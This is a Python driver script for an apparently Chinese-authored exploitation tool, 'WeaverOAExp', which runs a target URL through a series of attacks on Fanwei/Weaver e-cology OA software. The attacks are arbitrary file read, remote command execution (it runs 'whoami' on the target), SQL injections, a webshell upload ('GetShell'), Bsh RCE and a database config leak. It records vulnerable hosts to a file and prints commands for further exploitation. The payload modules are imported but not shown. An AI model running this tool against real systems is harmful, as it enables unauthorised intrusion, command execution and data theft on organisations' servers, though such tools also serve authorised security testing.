# -*- coding: utf-8 -*-
import time
from pyfiglet import Figlet


from cve.Fanwei.weaver_exp_master.poc import E_Bridge_Arbitrary_File_Read, E_Cology_WorkflowServiceXml_RCE, E_Cology_V8_Sql, \
    Weaver_Common_Ctrl_Upload, Bsh_RCE, WorkflowCenterTreeData_Sql, E_Cology_Database_Leak


class WeaverScan:
    def now_time(self):
        return self.BLUE + time.strftime("[%H:%M:%S] ", time.localtime()) + self.ENDC
    
    
    def info(self):
        return self.VIOLET + "[INFO] " + self.ENDC
    
    
    def error(self):
        return self.RED + "[ERROR] " + self.ENDC
    
    
    def warning(self):
        return self.YELLOW + "[WARNING] " + self.ENDC
    
    
    def success(self):
        return self.GREEN + "[SUCCESS] " + self.ENDC
    
    
    def result(self,name, url):
        file = open('./result/fanweiResult.txt', 'a')
        file.write(name + ': ' + url + '\n')
        file.close()
    
    
    def check(self,url):
        if url[-1] != '/':
            url += '/'
            if url[:4] != 'http':
                url = 'http://' + url
        print(self.now_time() + self.info() + 'Target: ' + url)
    
        # 泛微云桥任意文件读取
        print(self.now_time() + self.info() + '正在检测泛微云桥任意文件读取漏洞')
        id, system = E_Bridge_Arbitrary_File_Read.check(url)
        if id is None:
            print(self.now_time() + self.warning() + '不存在泛微云桥任意文件读取漏洞')
        else:
            E_Bridge_Arbitrary_File_Read.POC_2(url, id)
            print(self.now_time() + self.success() + 'python3 poc/E_Bridge_Arbitrary_File_Read.py {} 进行进一步利用'.format(url))
            self.result('泛微云桥任意文件读取', url)
    
        # 泛微 WorkflowServiceXml RCE
        print(self.now_time() + self.info() + '正在检测泛微 WorkflowServiceXml RCE 漏洞')
        if E_Cology_WorkflowServiceXml_RCE.exploit(url, 'whoami') is None:
            print(self.now_time() + self.warning() + '不存在泛微 WorkflowServiceXml RCE 漏洞')
        else:
            print(self.now_time() + self.info() + 'whoami: ' + E_Cology_WorkflowServiceXml_RCE.exploit(url, 'whoami'))
            print(self.now_time() + self.success() + 'python3 poc/E_Cology_WorkflowServiceXml_RCE.py {} cmd 进行进一步利用'.format(url))
            self.result('泛微 WorkflowServiceXml RCE', url)
    
        # 泛微OA V8 前台Sql注入
        print(self.now_time() + self.info() + '正在检测泛微 OA V8 前台SQL注入漏洞')
        if E_Cology_V8_Sql.poc(url) == 'ok':
            self.result('泛微OA V8前台Sql注入', url)
    
        # 泛微OA weaver.common.Ctrl 任意文件上传
        print(self.now_time() + self.info() + '正在检测泛微OA weaver.common.Ctrl 任意文件上传漏洞')
        if Weaver_Common_Ctrl_Upload.GetShell(url) == 'ok':
            self.result('泛微OA weaver.common.Ctrl 任意文件上传', url)
    
        # 泛微Bsh RCE
        print(self.now_time() + self.info() + '正在检测泛微OA Bsh RCE漏洞')
        if Bsh_RCE.Check(url) == 'ok':
            self.result('泛微OA Bsh RCE', url)
    
        # 泛微OA WorkflowCenterTreeData接口SQL注入
        print(self.now_time() + self.info() + '正在检测泛微OA WorkflowCenterTreeData接口SQL注入漏洞')
        if WorkflowCenterTreeData_Sql.exploit(url) == 'ok':
            self.result('泛微OA WorkflowCenterTreeData接口SQL注入', url)
    
        # 泛微OA e-cology 数据库配置信息泄漏
        print(self.now_time() + self.info() + '正在检测泛微OA e-cology 数据库配置信息泄漏漏洞')
        if E_Cology_Database_Leak.checkVulUrl(url) == 'ok':
            self.result('泛微OA 数据库配置信息泄漏漏洞', url)
    
    
    def main(self,target):
        self.BLUE = '\033[0;36m'
        self.RED = '\x1b[1;91m'
        self.YELLOW = '\033[1;33m'
        self.VIOLET = '\033[1;94m'
        self.GREEN = '\033[1;32m'
        self.BOLD = '\033[1m'
        self.ENDC = '\033[0m'
        print(self.VIOLET + Figlet(font='slant').renderText('WeaverOAExp') + self.ENDC)
        print('         Author: zjun        HomePage: www.zjun.info')
        url = target["url"].strip('/ ')
        self.check(url)

